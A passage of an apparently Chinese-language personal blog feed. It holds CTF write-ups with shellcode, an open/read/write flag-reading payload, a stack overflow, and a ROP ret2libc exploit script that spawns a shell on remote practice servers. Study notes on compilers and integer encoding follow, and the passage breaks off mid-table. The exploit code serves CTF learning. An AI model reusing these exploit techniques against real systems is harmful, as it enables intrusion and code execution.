class="string">mov rax,0</span></span><br><span class="line"><span class="string">mov rsi,0xCAFE0010</span></span><br><span class="line"><span class="string">mov rdi,0</span></span><br><span class="line"><span class="string">mov rdx,0x1000</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img data-src="/./../images/image-20230116111442132.png" alt="image-20230116111442132"></p><p>然后只能全部改成edi这种32位寄存器的形式了</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov eax,0</span></span><br><span class="line"><span class="string">mov esi,0xCAFE0010</span></span><br><span class="line"><span class="string">mov edi,0</span></span><br><span class="line"><span class="string">mov edx,0x1000</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>但是还是不行</p><p><img data-src="/./../images/image-20230116111621791.png" alt="image-20230116111621791"></p><p>把mov 0的操作全部换成xor，就对了</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">mov esi,0xCAFE0010</span></span><br><span class="line"><span class="string">xor edi,edi</span></span><br><span class="line"><span class="string">mov edx,0x1000</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img data-src="/./../images/image-20230116112543060.png" alt="image-20230116112543060"></p><p>这里要调用read，就要涉及系统调用号：</p><p>在汇编程序中使用Linux系统调用。 您需要采取以下步骤在程序中使用Linux系统调用 </p><ul><li>将系统调用号放在EAX寄存器中。</li><li>结果通常在EAX寄存器中返回</li></ul><p>&#x3D;&#x3D;这里注意64位和32的系统调用号是不一样的&#x3D;&#x3D;</p><ul><li>32位：<ul><li>传参方式：首先将系统调用号 传入 eax，sysread 的调用号 为 3 syswrite 的调用号 为 4</li></ul><p></p></li><li>64位：<ul><li>传参方式：首先将系统调用号 传入 rax，sysread 的调用号 为 0 syswrite 的调用号 为 1</li></ul></li></ul><p>所以这里的read系统调用号是0</p><p>这里写入read的shellcode后，执行我们写的shellcode，第二次写入的orw也是shellcode，这里要设置amd64位不然就无了。</p><p>这里有个细节在执行syscall指令时，程序会按照普通程序一样，会将shellcode的下一条指令压栈，所以在执行完syscall后，下一个指令要执行的地方就是syscall后的地址，这里除syscall这一条指令，长度为14，所以第二次写入的地址，只能是0xCAFE0000+14之后的地址，这里我们选择为0xCAFE0010就够了，然后直接写入orw的shellcode。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>))</span><br><span class="line">payload += asm(shellcraft.read(<span class="number">3</span>,<span class="number">0xcafe0500</span>,<span class="number">0x100</span>))</span><br><span class="line">payload += asm(shellcraft.write(<span class="number">1</span>,<span class="number">0xcafe0500</span>,<span class="number">0x100</span>))</span><br></pre></td></tr></table></figure><p>这里的缓冲区我原先是写0xcafe1000的，结果后面才发现它总共才申请了0x1000的大小内存，哈哈</p><p>完整代码:</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">30105</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">mov esi,0xCAFE0010</span></span><br><span class="line"><span class="string">xor edi,edi</span></span><br><span class="line"><span class="string">mov edx,0x1000</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;len:&#x27;</span>,<span class="built_in">len</span>(shellcode))</span><br><span class="line">io.sendafter(<span class="string">&#x27;shellcode:\n&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = b&#x27;\x90&#x27; * 0x10</span></span><br><span class="line">payload = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>))</span><br><span class="line">payload += asm(shellcraft.read(<span class="number">3</span>,<span class="number">0xcafe0500</span>,<span class="number">0x100</span>))</span><br><span class="line">payload += asm(shellcraft.write(<span class="number">1</span>,<span class="number">0xcafe0500</span>,<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>结果：</p><p><img data-src="/./../images/image-20230116113635529.png" alt="image-20230116113635529"></p><hr><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="before-main"><a href="#before-main" class="headerlink" title="before_main"></a>before_main</h3><p>题中 __attribute__属性修饰函数，参考链接：<a href="https://blog.csdn.net/xiao__1bai/article/details/124156235">(61条消息) 浅析逆向中 gcc 在主函数前后运行的函数_沐一 · 林的博客-CSDN博客_逆向 init</a></p><p>该题考查base64，换表函数定义了__ attribute__ ((constructor))会使函数在 main() 函数之前被执行</p><p>这里ptrace检测反调试，即出现反调试就不进行换表操作<img data-src="/./../images/image-20230214103452756.png" alt="image-20230214103452756"></p><p>自己手动换表后用cyberchef解base64即可</p><hr><h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="re-1"><a href="#re-1" class="headerlink" title="re"></a>re</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;复现hgame&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://pa1r0t.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>pwn_practice1</title>
    <link href="https://pa1r0t.github.io/2023/01/13/pwn-practice1/"/>
    <id>https://pa1r0t.github.io/2023/01/13/pwn-practice1/</id>
    <published>2023-01-13T03:50:36.000Z</published>
    <updated>2023-01-13T12:33:23.186Z</updated>
    
    <content type="html"><![CDATA[<p>pwn</p><span id="more"></span><h2 id="hgame2018-flag-server"><a href="#hgame2018-flag-server" class="headerlink" title="hgame2018_flag_server"></a>hgame2018_flag_server</h2><h3 id="开启docker"><a href="#开启docker" class="headerlink" title="开启docker"></a>开启docker</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -v <span class="string">&quot;<span class="subst">$(pwd)</span>:/ctf/work&quot;</span> -i -t skysider/pwndocker /bin/bash</span></span><br></pre></td></tr></table></figure><p><img data-src="/./../images/image-20230113115308826.png" alt="image-20230113115308826"></p><h3 id="程序核心逻辑"><a href="#程序核心逻辑" class="headerlink" title="程序核心逻辑"></a>程序核心逻辑</h3><p>这里有个随机值，输入的值和随机值比较</p><p><img data-src="/./../images/image-20230113115524208.png" alt="image-20230113115524208"></p><p>我准备用逆向的守法，来搞它，写了个cpp，结果运行多次结果都不一样</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;random&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span>  <span class="type">int</span> v3 = <span class="built_in">time</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,v3);</span><br><span class="line"><span class="built_in">srand</span>(v3);</span><br><span class="line"><span class="type">int</span> v8 = <span class="built_in">rand</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%u&quot;</span>,v8);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>giao~~~~~</p><p>然后我只能老老实实找漏洞了</p><p>先是发现可以读取字符串name<img data-src="/./../images/image-20230113115909861.png" alt="image-20230113115909861"></p><p>找到读取字符串的函数是自己编的<img data-src="/./../images/image-20230113115811014.png" alt="image-20230113115811014"></p><p>最后v10进行检验<img data-src="/./../images/image-20230113115933550.png" alt="image-20230113115933550"></p><p>这里看栈分布<img data-src="/./../images/image-20230113120005292.png" alt="image-20230113120005292"></p><p>直接在s1的下面，直接填充’A’*((0x50-0x10)+size(int))</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28388</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./flag_server&#x27;)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;your username length: &#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x44</span>)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img data-src="/./../images/image-20230113120243209.png" alt="image-20230113120243209"></p><hr><h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><h3 id="核心程序"><a href="#核心程序" class="headerlink" title="核心程序"></a>核心程序</h3><p><img data-src="/./../images/image-20230113201822956.png" alt="image-20230113201822956"></p><p><strong>利用点</strong>：利用gets，去覆盖栈中的内容，利用rop链泄漏puts函数在内存中的地址，然后通过这个地址去找对应版本的libc，找到内存中system的地址和bin_sh字符串的地址，再利用一次rop链执行system函数即可</p><p>这里有一个模块叫LibcSearcher，它可以让使用者不用担心本地和远程的libc是否统一，它可以帮你去寻找正在执行的libc。非常好用</p><h3 id="寻找rop"><a href="#寻找rop" class="headerlink" title="寻找rop"></a>寻找rop</h3><p>目的：寻找pop rdi ret;指令，因为该文件是64位，而64位文件采用寄存器存放参数，第一个参数存放的寄存器就是rdi</p><p>命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary ./ciscn_2019_c_1 --only <span class="string">&#x27;pop|ret&#x27;</span></span><br></pre></td></tr></table></figure><p>结果：</p><p><img data-src="/./../images/image-20230113202715207.png" alt="image-20230113202715207"></p><h3 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26320</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">encrypt_addr = elf.sym[<span class="string">&#x27;encrypt&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]<span class="comment"># 用于打印puts的地址</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]<span class="comment"># puts函数地址</span></span><br><span class="line">rdi_ret = <span class="number">0x400c83</span></span><br><span class="line"><span class="comment"># puts函数的参数puts函数的地址puts函数执行完的返回地址，用于下一次的shellcode</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>,payload1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># 拿到puts在内存中的地址</span></span><br><span class="line">puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;addr:&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找内存libc的地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">addr_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc&#x27;</span>,addr_base)</span><br><span class="line">sys_addr = libc.dump(<span class="string">&#x27;system&#x27;</span>) + addr_base</span><br><span class="line">binsh_addr = libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) + addr_base</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(rdi_ret) + p64(binsh_addr) + p64(sys_addr) + p64(encrypt_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>,payload2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h3><p><img data-src="/./../images/image-20230113203306010.png" alt="image-20230113203306010"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;pwn&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://pa1r0t.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>编译2</title>
    <link href="https://pa1r0t.github.io/2023/01/12/%E7%BC%96%E8%AF%91%E5%81%8F2/"/>
    <id>https://pa1r0t.github.io/2023/01/12/%E7%BC%96%E8%AF%91%E5%81%8F2/</id>
    <published>2023-01-12T14:07:41.000Z</published>
    <updated>2023-01-14T12:49:16.099Z</updated>
    
    <content type="html"><![CDATA[<p>高级语言描述</p><span id="more"></span><h3 id="编译基础知识"><a href="#编译基础知识" class="headerlink" title="编译基础知识"></a>编译基础知识</h3><ol><li>高级语言：程序语言是一个记号系统</li><li>语法<ul><li>语法使得这串字符形成一个形式上正确的程序。</li><li>语法＝词法规则＋语法规则</li><li>例如：<ul><li>0.5*x1+c *</li><li>0.5、x1、c、+是语言的单词符号 </li><li>0.5*x1+c是语言的语法单位</li></ul></li><li>语法单位：表达式、子句、语句、函数、过程、程序</li><li>语言的词法规则和语法规则定义了程序的形 式结构，是判断输入字符串是否构成一个形 式上正确的程序的依据。</li></ul></li><li>语义</li></ol><h3 id="字母表和符号表"><a href="#字母表和符号表" class="headerlink" title="字母表和符号表"></a>字母表和符号表</h3><p>一些概念：</p><ol><li><p>字母表：是符号的非空有穷集合，是符号的非空有穷集合</p></li><li><p>符号串：顾名思义。空串：不含有任何符号的串称作空串，记作ε</p></li><li><p>句子：字母表上符合某种规则构成的串。串就是句子</p><p>（注：约定用a,b,c…表示符号；用α,β,γ…表示符号串； 用A,B,C…表示其集合）</p></li></ol><p>符号串集合的运算：</p><p><img data-src="/./../images/image-20230112222858340.png" alt="image-20230112222858340"></p><p>符号串集合的运算：</p><p>例如：A&#x3D;{a,b}; B&#x3D;{c,e,d}</p><p>则AB&#x3D;{ac,ae,ad,bc,be,bd}</p><p>A中的元素必须在B元素的前面，否则是错的，这个顺序要搞对</p><p>例如：串集A＝{a}的各次方幂定义为：</p><p>– A0&#x3D;{ε} </p><p>– A1&#x3D;A&#x3D;{a}</p><p> – …… </p><p>– An&#x3D;AAn-1(n&gt;0)&#x3D;{a…a}</p><p>字母表的闭包与正闭包</p><ol><li>字母表A的闭包（A<em>）：A</em>&#x3D;A0∪A1∪A2∪… 即：由A上符号组成的所有串的集合（包括空串 ε ）</li><li>字母表A的正闭包（A+）：A+&#x3D; A1 ∪A2∪ …&#x3D;A*-{ε}   即：由A上符号组成的所有串的集合（不包括空 串ε ）</li><li>字母表上语言：是字母表上正闭包的子集</li></ol><h3 id="文法与语言的关系"><a href="#文法与语言的关系" class="headerlink" title="文法与语言的关系"></a>文法与语言的关系</h3><p>文法：</p><ul><li>其语法规则如下：<ul><li>– &lt;句子&gt;→&lt;主语&gt;&lt;谓语&gt; </li><li>– &lt;主语&gt; →&lt;形容词&gt;&lt;名词&gt;</li><li>– &lt;谓语&gt; →&lt;动词&gt;&lt;宾语&gt;</li><li>– &lt;宾语&gt; → &lt;形容词&gt;&lt;名词&gt;</li><li>– &lt;形容词&gt; →Young | pop</li><li>– &lt;名词&gt; →men | music </li><li>– &lt;动词&gt; →like</li></ul></li></ul><p>相关概念：</p><ol><li>非终结符<ul><li>出现在规则的左部、用&lt;&gt;括起来、表示一定 语法概念的词</li><li>非终结符集合用VN表示。</li></ul></li><li>终结符<ul><li>语言中不可再分割的字符串(包括单个字符 组成的串)。注：终结符是组成句子的基本单位</li><li>终结符集合用VT表示。</li></ul></li><li>开始符号</li></ol><p><img data-src="/./../images/image-20230114204912084.png" alt="image-20230114204912084"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;高级语言描述&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>csapp1</title>
    <link href="https://pa1r0t.github.io/2023/01/09/csapp1/"/>
    <id>https://pa1r0t.github.io/2023/01/09/csapp1/</id>
    <published>2023-01-09T06:30:39.000Z</published>
    <updated>2023-01-17T07:43:40.272Z</updated>
    
    <content type="html"><![CDATA[<p>学习一下csapp,第一篇</p><span id="more"></span><p>在32位系统：-2147483648&lt;2147483647结果为false</p><p>​int i &#x3D; -2147483648;i&lt;2147483647结果为true</p><p>​-2147483648-1&lt;2147483647结果为true</p><p>在计算机中运算是会发生溢出，假如运算后的数超过了32位，那最终结果可能是一个负数，或者是其他正整数</p><p>我们用linux中的gdb软件来证明其中的结论</p><p><img data-src="/./../images/image-20230109200402530.png" alt="image-20230109200402530"></p><p>很显然，上述超乎我们的预想</p><p>然而在整数运算时是符合交换律的，但是在计算机中浮点数却不符合交换律</p><p>这里做一个实验：用(1e20 + -1e20) + 3.14</p><p>结果为：3.1400000000000001</p><p>再用1e20 + (-1e20 + 3.14)，这里3.14对于-1e20微不足道</p><p>结果为：0</p><p>他们用有限的位组合形式表示在数域中无线扩张的数</p><p><img data-src="/./../images/image-20230109202910325.png" alt="image-20230109202910325"></p><h3 id="定点数和浮点数"><a href="#定点数和浮点数" class="headerlink" title="定点数和浮点数"></a>定点数和浮点数</h3><p>计算机中只能通过约定小数点的位置来表示</p><ul><li>小数点位置约定在固定位置的数称为定点数</li><li>小数点位置约定为可浮动的数称为浮点数</li><li>定点小数用来表示浮点数的尾数部分</li><li>任何实数：X&#x3D;(-1)^s^ ×M×R^E^</li></ul><p>其中，S取值为0或1，用来决定数X的符号；M是一个二进制定点小数 ，称为数X的尾数（mantissa）；E是一个二进制定点整数，称为数X 的阶或指数（exponent）；R是基数（radix、base），可以为2、4和16等,计算机中只要表示S、M和E三个信息，就能确定X的值，叫浮点数</p><h3 id="定点数的编码表示"><a href="#定点数的编码表示" class="headerlink" title="定点数的编码表示"></a>定点数的编码表示</h3><p>浮点数（可用一个定点小数和一个定点整数来表示）</p><p>定点数的编码（解决正负号问题）: 原码、补码、移码、反码 （很少用）</p><h4 id="原码表示："><a href="#原码表示：" class="headerlink" title="原码表示："></a>原码表示：</h4><p><img data-src="/./../images/image-20230114214440623.png" alt="image-20230114214440623"></p><ul><li>其中由上图得0有两种表示，不唯一</li><li>加减方式，对于同号，取绝对值相加，然后在加上符号，对于异号，是比较哪个绝对值大，然后大的间小的，然后再加上绝对值大的符号。这样加减方式繁琐不统一</li></ul><p>&#x3D;&#x3D;从 50年代开始，整数都采用补码来表示 但浮点数的尾数用原码定点小数表示&#x3D;&#x3D;</p><h3 id="补码-模运算（modular运算）"><a href="#补码-模运算（modular运算）" class="headerlink" title="补码 - 模运算（modular运算）"></a>补码 - 模运算（modular运算）</h3><p>在一个模运算系统中，一个数与它除以“模”后的余数等价</p><p>一个负数的补码等于模减该负数的绝对值</p><p>对于某一确定的模，某数减去小于模的另一数，总可 以用该数加上另一数负数的补码来代替</p><p><strong>补码（modular运算）：+ 和– 的统一</strong></p><p>例1：“钟表”模运算系统 假定时针只能顺拨，从10点倒拨4格后是几点？ </p><p>10- 4 &#x3D; 10+(12- 4) &#x3D; 10+8 &#x3D; 6（mod 12）</p><p><img data-src="/./../images/image-20230114220017752.png" alt="image-20230114220017752"></p><h3 id="结论：一个负数的补码等于将对应正数补码-各位取反、末位加一"><a href="#结论：一个负数的补码等于将对应正数补码-各位取反、末位加一" class="headerlink" title="结论：一个负数的补码等于将对应正数补码 各位取反、末位加一"></a>结论：一个负数的补码等于将对应正数补码 各位取反、末位加一</h3><p>补码的定义 假定补码有n位，则：[X]补&#x3D; 2n + X （-2n-1≤X＜2n-1 ，mod 2n）</p><p>X是真值，[x]补是机器数</p><h2 id="求特殊数的补码"><a href="#求特殊数的补码" class="headerlink" title="求特殊数的补码"></a>求特殊数的补码</h2><p>假定机器数有n位：</p><p>① [-2^n-1^]<del>补</del>&#x3D; 2^n^ - 2^n-1^ &#x3D; 10…0（n-1个0） （mod 2^n^）</p><p>② [-1]<del>补</del>&#x3D; 2^n^ - 0…01 &#x3D; 11…1（n个1） （mod 2^n^)</p><p>③ [+0]<del>补</del>&#x3D; [-0]<del>补</del>&#x3D; 00…0（n个0）</p><h2 id="变形补码的表示"><a href="#变形补码的表示" class="headerlink" title="变形补码的表示"></a>变形补码的表示</h2><p>变形（4’s）补码：双符号，用于存放可能溢出的中间结果</p><p><img data-src="/./../images/image-20230117124905779.png" alt="image-20230117124905779"></p><p>求真值的补码:</p><p>简便方法：从右向左遇到第一个1的前面各位取反</p><p>求补码的真值:</p><p>简便求法： 符号为0，则为正数，数值部分相同 符号为1，则为负数，数值各位取反，末位加1</p><p><img data-src="/./../images/image-20230117125216871.png" alt="image-20230117125216871"></p><h2 id="移码表示Excess"><a href="#移码表示Excess" class="headerlink" title="移码表示Excess"></a>移码表示Excess</h2><ul><li>什么是移码表示？<ul><li>将每一个数值加上一个偏置常数（ Excess &#x2F; bias）</li></ul></li><li>通常，当编码位数为n时，bias取 2^n-1^ 或 2^n-1^-1（如 IEEE 754)</li></ul><p><img data-src="/./../images/image-20230117125707755.png" alt="image-20230117125707755"></p><ul><li>为什么要用移码来表示指数（阶码）?<ul><li>便于浮点数加减运算时的对阶操作（比较大小）</li></ul></li></ul><p><img data-src="/./../images/image-20230117125855689.png" alt="image-20230117125855689"></p><h2 id="带符号整数"><a href="#带符号整数" class="headerlink" title="带符号整数"></a>带符号整数</h2><p>有三种定点编码方式：</p><ul><li>Signed and magnitude （原码）：定点小数，用来表示浮点数的尾数</li><li>Excess (biased) notion （移码）：定点整数，用于表示浮点数的阶（指数）</li><li>Two’s complement （补码）：50年代以来，所有计算机都用补码来表示带符号整数</li></ul><p>为什么用补码表示带符号整数？</p><ul><li>补码运算系统是模运算系统，加、减运算统一</li><li>数0的表示唯一，方便使用</li><li>比原码多表示一个最小负数</li></ul><p>无符号数:常在一个数的后面加一个“u”或“U”表示无符号数</p><p>&#x3D;&#x3D;若同时有无符号和带符号整数，则C编译器将带符号整数强制转换为无符号数&#x3D;&#x3D;</p><p><img data-src="/./../images/image-20230117152023145.png" alt="image-20230117152023145"></p><p>带*的与预想的不同</p><p><img data-src="/./../images/image-20230117152423930.png" alt="image-20230117152423930"></p><h4 id="编译器处理常量时默认的类型"><a href="#编译器处理常量时默认的类型" class="headerlink" title="编译器处理常量时默认的类型"></a>编译器处理常量时默认的类型</h4><p><img data-src="/./../images/image-20230117153309750.png" alt="image-20230117153309750"></p><p>C表达式-2147483648 &lt; 2147483647的执行结 果为false，这是因为编译器在编译时，是把符号和字面量分开识别，先识别字面量2147483648，2147483648在C90中时2^31^,属于unsigned int，所以此次比较是根据无符号数来进行比较。</p><p>若定义变量“int i&#x3D;-2147483648;”，则“i &lt; 2147483647”的执行 结果为true，这个不用解释，int类型已经定义好类型了，不需要再判别</p><p>如果将表达式写成“-2147483647-1 &lt; 2147483647”，则结果会怎 样呢？是true</p><p>不过C99的标准不一样，看上面的表就知道</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习一下csapp,第一篇&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>编译篇1</title>
    <link href="https://pa1r0t.github.io/2023/01/09/%E7%BC%96%E8%AF%91%E7%AF%871/"/>
    <id>https://pa1r0t.github.io/2023/01/09/%E7%BC%96%E8%AF%91%E7%AF%871/</id>
    <published>2023-01-09T02:16:11.000Z</published>
    <updated>2023-01-14T11:28:58.372Z</updated>
    
    <content type="html"><![CDATA[<p>引论学习</p><span id="more"></span><h3 id="程序设计语言的转换"><a href="#程序设计语言的转换" class="headerlink" title="程序设计语言的转换"></a>程序设计语言的转换</h3><ul><li>编译：从高级语言到低级语言的过程</li><li>解释：接受高级语言的一条语句输入，进行解释并控制计算机执行，马上获得该语句的执行结果，然后接受下一条语句<ul><li>优点：实现人机交互</li><li>缺点：效率差，每次都要解释，而不像编译一样，只需编译一次，以后只需执行即可</li></ul></li><li>编译的转换过程：<ul><li>两阶段转换：编译一一执行<img data-src="/./../images/image-20230109130459860.png" alt="image-20230109130459860"></li><li>三个阶段的转换：编译一一汇编一一运行<img data-src="/./../images/image-20230109131018804.png" alt="image-20230109131018804"></li></ul></li></ul><h3 id="编译程序概述"><a href="#编译程序概述" class="headerlink" title="编译程序概述"></a>编译程序概述</h3><p>自然语言的翻译：</p><ol><li>识别句子中一个个单词</li><li>分析句子的语法结构</li><li>根据句子的含义进行初步翻译</li><li>对译文进行修饰</li><li>写出最后译文</li></ol><p>编译程序的工作：</p><ul><li>词法分析</li><li>语法分析</li><li>语义分析和中间代码的生成</li><li>优化</li><li>目标代码的生成</li></ul><p><img data-src="/./../images/image-20230109173201830.png" alt="image-20230109173201830"></p><p>词法分析：</p><ul><li>任务：对源程序的字符串进行扫描和分解，识别出一个个单词</li><li>基本字：void,int,float</li><li>标识符：a,b,c,d</li><li>长整数：50</li><li>运算符：+，-，*，&#x3D;</li><li>界限符：{}，；（）</li><li>词法分析依照词法规则，识别出正确的单词，转换成统一规格，备用</li><li>转换：<ul><li>对基本字、运算符、界限符的转换</li><li>标识符的转换</li><li>常数的转换</li><li>转换完成的格式（类号、内码）</li></ul></li><li>描述词法规则的有效工具是正规式和有限自动机</li></ul><p>语法分析：</p><ul><li>任务：词法分析后的单词，根据语言的语法规则，把单词符号组成各类语法单位：子句、语句</li><li>语法规则：规定单词如何组成句，称为文法</li><li>语法规则的表示：<ul><li>BNF:A::&#x3D;B|C表示A定义为B或C</li></ul></li><li>语法分析的方法：<strong>推导</strong>和<strong>规约</strong></li><li>推导：最左推导和最右推导</li><li>规约：最右规约和最左规约</li></ul><p>赋值语句的语法规则：</p><ul><li>A::&#x3D;V&#x3D;E</li><li>E::&#x3D;T|E+T</li><li>T::&#x3D;F|T*F</li><li>F::&#x3D;V|(E)|C</li><li>V::&#x3D;标识符</li><li>C::&#x3D;常数</li></ul><h4 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h4><p>​x &#x3D; a + b*50根据上面的文法规则运用最右推导：最右推导就是每次只变换最右的字母</p><p>A&#x3D;&gt;V&#x3D;E&#x3D;&gt;V&#x3D;E+T&#x3D;&gt;V&#x3D;E+T*F&#x3D;&gt;</p><p>T&#x3D;E+T*C&#x3D;&gt;</p><p>T&#x3D;E+T*50&#x3D;&gt;</p><p>T&#x3D;E+F*50&#x3D;&gt;</p><p>T&#x3D;E+V*50&#x3D;&gt;</p><p>T&#x3D;E+b*50&#x3D;&gt;</p><p>T&#x3D;T+b*50&#x3D;&gt;</p><p>T&#x3D;V+b*50&#x3D;&gt;</p><p>T&#x3D;a+b*50</p><p>如何最左规约，就是从T&#x3D;a+b*50变换到A,也就是赋值运算成立，每次只变换最左边的字母，是最右推导的逆运算</p><p>计算机是用语法树来检验语法：</p><p><img data-src="/./../images/image-20230109181128958.png" alt="image-20230109181128958"></p><h3 id="中间代码生成"><a href="#中间代码生成" class="headerlink" title="中间代码生成"></a>中间代码生成</h3><ul><li>任务：根据语法分析其中的含义，进行初步翻译，产生介于源代码和目标代码之间的一种代码</li><li>分为两阶段的工作：<ul><li>对每种语法范畴进行静态语义检查</li><li>如果语义正确，就进行中间代码的翻译</li></ul></li><li>中间代码形式：四元式、三元式、逆波兰式</li></ul><p>将x&#x3D;a+b*50变成中间代码：</p><table><thead><tr><th align="center">序号</th><th align="center">算符</th><th align="center">左操作数</th><th align="center">右操作数</th><th 